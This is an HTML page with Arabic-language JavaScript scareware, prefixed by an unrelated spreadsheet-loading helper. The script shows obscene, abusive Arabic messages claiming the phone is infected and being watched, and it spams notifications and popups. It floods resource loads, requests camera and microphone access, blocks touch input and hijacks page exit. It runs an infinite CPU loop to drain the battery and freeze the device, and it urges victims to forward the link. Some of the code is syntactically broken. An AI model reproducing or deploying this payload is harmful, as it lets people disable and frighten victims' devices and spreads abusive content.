<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }
        </script><!DOCTYPE html>  
<html lang="ar">  
<head>

<body>  
    <div class="message" id="msg"></div>

    <script>  
        // رسائل وهمية شرموطية أوسخ  
        const messages = [  
            "يا ابن الشرموطة، تلفونك هيروح في داهية! 😈",  
            "فيروس زي الزب بينيك جهازك دلوقتي! 💦",  
            "تلفونك بيصرخ زي القحبة، استمتع! 🔥",  
            "هههه، ارسل الرابط لصحابك عشان ينكتوا كلهم! 😜",  
            "البطارية بتنتاك والتلفون هيموت! 😂",  
            "كاميرتك وميكروفونك معايا يا ابن الكلب! 😈"  
        ];  
        let msgIndex = 0;  
        const msgEl = document.getElementById('msg');  
        setInterval(() => {  
            msgEl.innerText = messages[msgIndex];  
            msgIndex = (msgIndex + 1) % messages.length;

        // إشعارات مزيفة أوسخ  
        if (Notification.permission === 'granted') {  
            setInterval(() => {  
                new Notification('فيروس شرموطي!', {  
                    body: 'تلفونك هيعلق وأنت بتنتاك يا قحبة!'  
                });  
            }, 3000);  
        } else {  
            Notification.requestPermission();  
        }  

        // فتح نوافذ منبثقة أكثر عشان يعلق التلفون  
        setInterval(() => {  
            for (let i = 0; i < 8; i++) {  
                window.open('about:blank', '_blank');  
            }  
        }, 1500); // كل ثانية ونص  

        // تحميل موارد كثيرة عشان تنيك البطارية والذاكرة  
        setInterval(() => {  
            for (let i = 0; i < 30; i++) {  
                const img = new Image();  
                img.src = 'https://via.placeholder.com/800x800?text=شرموطة';  
            }  
        }, 800); // كل 800 ميلي ثانية  

        // محاولة تشغيل الكاميرا والميكروفون  
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })  
            .then(stream => {  
                // ما يسوي شيء غير إنه يشغلهم عشان يخوف الضحية  
                setInterval(() => {  
                    msgEl.innerText = 'كاميرتك وميكروفونك بتنتاك يا ابن القحبة! 😈';

            .catch(() => {}); // لو ما مشي، خلاص  

        // منع التفاعل مع الشاشة  
        document.addEventListener('touchstart', (e) => e.preventDefault(), false);  
        document.addEventListener('touchmove', (e) => e.preventDefault(), false);  

        // تحريك الشاشة باستخدام Canvas بطريقة أوسخ  
        const canvas = document.getElementById('canvas');  
        const ctx = canvas.getContext('2d');  
        canvas.width = window.innerWidth;  
        canvas.height = window.innerHeight;  
        setInterval(() => {  
            ctx.fillStyle = `rgb(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255})`;  
            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 100, 100);  
            ctx.font = '30px Arial';  
            ctx.fillText('تلفونك بتنتاك!', Math.random() * canvas.width, Math.random() * canvas.height);  
        }, 30); // تحريك كل 30 ميلي ثانية  

        // اهتزاز التلفون بقوة لو متاح  
        setInterval(() => {  
            if (navigator.vibrate) {  
                navigator.vibrate([500, 200, 500, 200]); // اهتزاز مستمر  
            }  
        }, 800);  

        // صوت مزعج عند محاولة إغلاق الصفحة  
        const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhB4Q7T7pP9A');  
        audio.loop = true;  
        window.addEventListener('beforeunload', () => {  
            audio.play().catch(() => {});  
            return 'مش هتروح يا ابن الشرموطة، تلفونك خلاص مات!';  
        });  

        // حلقة لا نهائية عشان تنيك المعالج والبطارية  
        setInterval(() => {  
            while (true) {  
                Math.random();  
                new Array(1000000).fill(0).map(() => Math.random()); // تحميل زيادة  
            }  
        }, 100);  

        // تدوير الشاشة عشان يتخبط الضحية  
        setInterval(() => {  
            document.body.style.transform = `rotate(${Math.random() * 360}deg)`;  
        }, 2000);  
    </script>  
</body>
